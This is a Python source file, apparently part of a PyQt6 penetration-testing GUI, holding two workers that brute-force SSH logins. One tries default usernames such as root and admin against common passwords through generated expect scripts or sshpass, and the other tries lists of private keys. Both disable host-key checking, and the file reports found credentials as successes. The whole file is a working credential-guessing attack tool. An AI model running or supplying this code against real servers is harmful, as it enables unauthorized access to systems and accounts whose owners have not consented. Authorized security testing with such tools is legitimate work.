# app/tools/ssh_bruteforce_worker.py
import socket
import threading
import time
from typing import List, Dict, Optional, Callable
from PyQt6.QtCore import QObject, pyqtSignal, QRunnable
from ..core.ssh_protocol import create_ssh_protocol

class SSHBruteforceSignals(QObject):
    output = pyqtSignal(str)
    finished = pyqtSignal()
    credentials_found = pyqtSignal(dict)
    progress_updated = pyqtSignal(int, int)

class SSHBruteforceWorker(QRunnable):
    """SSH bruteforce attack worker for exploitation phase"""
    
    def __init__(self, target: str, port: int = 22, usernames: List[str] = None, 
                 passwords: List[str] = None, max_threads: int = 5, delay: float = 0.1):
        super().__init__()
        self.target = target
        self.port = port
        self.usernames = usernames or ['root', 'admin', 'user', 'test']
        self.passwords = passwords or ['password', 'admin', '123456', 'root', 'toor']
        self.max_threads = max_threads
        self.delay = delay
        self.signals = SSHBruteforceSignals()
        self.is_running = True
        self.found_credentials = []
        self.attempts = 0
        self.total_attempts = 0
        self.lock = threading.Lock()
        
    def run(self):
        """Execute SSH bruteforce attack"""
        try:
            self.signals.output.emit(f"<p style='color: #FF6B6B;'>[BRUTEFORCE] Starting SSH bruteforce attack on {self.target}:{self.port}</p><br>")
            
            # Check if SSH is accessible
            if not self._check_ssh_accessible():
                self.signals.output.emit(f"<p style='color: #FF6B6B;'>[ERROR] SSH service not accessible on {self.target}:{self.port}</p><br>")
                return
            
            self.total_attempts = len(self.usernames) * len(self.passwords)
            self.signals.output.emit(f"<p style='color: #87CEEB;'>[INFO] Testing {self.total_attempts} credential combinations</p><br>")
            
            # Create thread pool for concurrent attacks
            threads = []
            semaphore = threading.Semaphore(self.max_threads)
            
            for username in self.usernames:
                if not self.is_running:
                    break
                    
                for password in self.passwords:
                    if not self.is_running:
                        break
                    
                    thread = threading.Thread(
                        target=self._test_credentials,
                        args=(username, password, semaphore)
                    )
                    threads.append(thread)
                    thread.start()
                    
                    time.sleep(self.delay)  # Rate limiting
            
            # Wait for all threads to complete
            for thread in threads:
                thread.join()
            
            # Report results
            if self.found_credentials:
                self.signals.output.emit(f"<p style='color: #00FF41;'>[SUCCESS] Found {len(self.found_credentials)} valid credentials:</p><br>")
                for cred in self.found_credentials:
                    self.signals.output.emit(f"<p style='color: #00FF41;'>  [+] {cred['username']}:{cred['password']}</p><br>")
                    self.signals.credentials_found.emit(cred)
            else:
                self.signals.output.emit(f"<p style='color: #FFAA00;'>[INFO] No valid credentials found</p><br>")
            
            self.signals.output.emit(f"<p style='color: #87CEEB;'>[INFO] Bruteforce attack completed ({self.attempts}/{self.total_attempts} attempts)</p><br>")
            
        except Exception as e:
            self.signals.output.emit(f"<p style='color: #FF6B6B;'>[ERROR] Bruteforce attack failed: {e}</p><br>")
        finally:
            self.signals.finished.emit()
    
    def _check_ssh_accessible(self) -> bool:
        """Check if SSH service is accessible"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((self.target, self.port))
            sock.close()
            return result == 0
        except:
            return False
    
    def _test_credentials(self, username: str, password: str, semaphore: threading.Semaphore):
        """Test individual credential pair"""
        with semaphore:
            if not self.is_running:
                return
            
            try:
                success = self._attempt_ssh_login(username, password)
                
                with self.lock:
                    self.attempts += 1
                    self.signals.progress_updated.emit(self.attempts, self.total_attempts)
                
                if success:
                    credential = {
                        'target': self.target,
                        'port': self.port,
                        'username': username,
                        'password': password,
                        'method': 'password',
                        'timestamp': time.time()
                    }
                    
                    with self.lock:
                        self.found_credentials.append(credential)
                    
                    self.signals.output.emit(f"<p style='color: #00FF41;'>[SUCCESS] Valid credentials: {username}:{password}</p><br>")
                else:
                    self.signals.output.emit(f"<p style='color: #FF6B6B;'>[-] Failed: {username}:{password}</p><br>")
                    
            except Exception as e:
                self.signals.output.emit(f"<p style='color: #FFAA00;'>[WARNING] Error testing {username}:{password} - {e}</p><br>")
    
    def _attempt_ssh_login(self, username: str, password: str) -> bool:
        """Attempt SSH login with credentials using raw SSH protocol"""
        return self._basic_ssh_test(username, password)
    
    def _basic_ssh_test(self, username: str, password: str) -> bool:
        """Test SSH authentication using real SSH protocol"""
        try:
            import subprocess
            import tempfile
            import os
            
            print(f"[DEBUG] Testing SSH auth for {username}:{password} on {self.target}:{self.port}")
            
            # Try using system SSH with expect
            expect_script = f'''#!/usr/bin/expect -f
set timeout 10
log_user 0
spawn ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -p {self.port} {username}@{self.target} "echo SSH_AUTH_SUCCESS"
expect {{
    "password:" {{
        send "{password}\\r"
        expect {{
            "SSH_AUTH_SUCCESS" {{
                puts "SUCCESS"
                exit 0
            }}
            "Permission denied" {{
                puts "DENIED"
                exit 1
            }}
            timeout {{
                puts "TIMEOUT"
                exit 1
            }}
        }}
    }}
    "Permission denied" {{
        puts "DENIED"
        exit 1
    }}
    timeout {{
        puts "TIMEOUT"
        exit 1
    }}
}}'''
            
            try:
                with tempfile.NamedTemporaryFile(mode='w', suffix='.exp', delete=False) as f:
                    f.write(expect_script)
                    script_path = f.name
                
                os.chmod(script_path, 0o755)
                result = subprocess.run(['expect', script_path], 
                                      capture_output=True, text=True, timeout=15)
                
                print(f"[DEBUG] Expect result: returncode={result.returncode}, stdout='{result.stdout.strip()}', stderr='{result.stderr.strip()}'")
                
                os.unlink(script_path)
                return result.returncode == 0 and 'SUCCESS' in result.stdout
                
            except (FileNotFoundError, OSError) as e:
                print(f"[DEBUG] Expect not available: {e}")
                
                # Try sshpass as fallback
                try:
                    cmd = ['sshpass', '-p', password, 'ssh', 
                          '-o', 'StrictHostKeyChecking=no', 
                          '-o', 'ConnectTimeout=5',
                          '-p', str(self.port),
                          f'{username}@{self.target}', 'echo SSH_AUTH_SUCCESS']
                    
                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                    print(f"[DEBUG] sshpass result: returncode={result.returncode}, stdout='{result.stdout.strip()}', stderr='{result.stderr.strip()}'")
                    
                    return result.returncode == 0 and 'SSH_AUTH_SUCCESS' in result.stdout
                    
                except (FileNotFoundError, OSError) as e:
                    print(f"[DEBUG] sshpass not available: {e}")
                    return False
            
        except Exception as e:
            print(f"[DEBUG] Exception in SSH test: {e}")
            return False
    

    

    
    def stop(self):
        """Stop the bruteforce attack"""
        self.is_running = False

class SSHKeyBruteforceWorker(QRunnable):
    """SSH key-based bruteforce worker"""
    
    def __init__(self, target: str, port: int = 22, usernames: List[str] = None, 
                 key_paths: List[str] = None, max_threads: int = 3):
        super().__init__()
        self.target = target
        self.port = port
        self.usernames = usernames or ['root', 'admin', 'user']
        self.key_paths = key_paths or []
        self.max_threads = max_threads
        self.signals = SSHBruteforceSignals()
        self.is_running = True
        self.found_credentials = []
        
    def run(self):
        """Execute SSH key bruteforce attack"""
        try:
            self.signals.output.emit(f"<p style='color: #FF6B6B;'>[KEY-BRUTEFORCE] Starting SSH key bruteforce on {self.target}:{self.port}</p><br>")
            
            if not self.key_paths:
                self.signals.output.emit(f"<p style='color: #FFAA00;'>[WARNING] No SSH keys provided for testing</p><br>")
                return
            
            total_attempts = len(self.usernames) * len(self.key_paths)
            self.signals.output.emit(f"<p style='color: #87CEEB;'>[INFO] Testing {total_attempts} key combinations</p><br>")
            
            attempts = 0
            for username in self.usernames:
                if not self.is_running:
                    break
                    
                for key_path in self.key_paths:
                    if not self.is_running:
                        break
                    
                    attempts += 1
                    self.signals.progress_updated.emit(attempts, total_attempts)
                    
                    if self._test_key_auth(username, key_path):
                        credential = {
                            'target': self.target,
                            'port': self.port,
                            'username': username,
                            'key_path': key_path,
                            'method': 'key',
                            'timestamp': time.time()
                        }
                        self.found_credentials.append(credential)
                        self.signals.output.emit(f"<p style='color: #00FF41;'>[SUCCESS] Valid key: {username}@{key_path}</p><br>")
                        self.signals.credentials_found.emit(credential)
                    else:
                        self.signals.output.emit(f"<p style='color: #FF6B6B;'>[-] Failed: {username}@{key_path}</p><br>")
            
            if self.found_credentials:
                self.signals.output.emit(f"<p style='color: #00FF41;'>[SUCCESS] Found {len(self.found_credentials)} valid keys</p><br>")
            else:
                self.signals.output.emit(f"<p style='color: #FFAA00;'>[INFO] No valid keys found</p><br>")
                
        except Exception as e:
            self.signals.output.emit(f"<p style='color: #FF6B6B;'>[ERROR] Key bruteforce failed: {e}</p><br>")
        finally:
            self.signals.finished.emit()
    
    def _test_key_auth(self, username: str, key_path: str) -> bool:
        """Test SSH key authentication"""
        try:
            import os
            import subprocess
            
            if not os.path.exists(key_path):
                return False
            
            # Test key authentication using system SSH client
            cmd = [
                'ssh', '-o', 'StrictHostKeyChecking=no', '-o', 'ConnectTimeout=5',
                '-o', 'BatchMode=yes', '-i', key_path, '-p', str(self.port),
                f'{username}@{self.target}', 'echo test'
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            return result.returncode == 0 and 'test' in result.stdout
            
        except Exception:
            return False
    
    def stop(self):
        """Stop the key bruteforce attack"""
        self.is_running = False

def create_ssh_bruteforce_worker(target: str, port: int = 22, **kwargs) -> SSHBruteforceWorker:
    """Factory function to create SSH bruteforce worker"""
    return SSHBruteforceWorker(target, port, **kwargs)

def create_ssh_key_bruteforce_worker(target: str, port: int = 22, **kwargs) -> SSHKeyBruteforceWorker:
    """Factory function to create SSH key bruteforce worker"""
    return SSHKeyBruteforceWorker(target, port, **kwargs)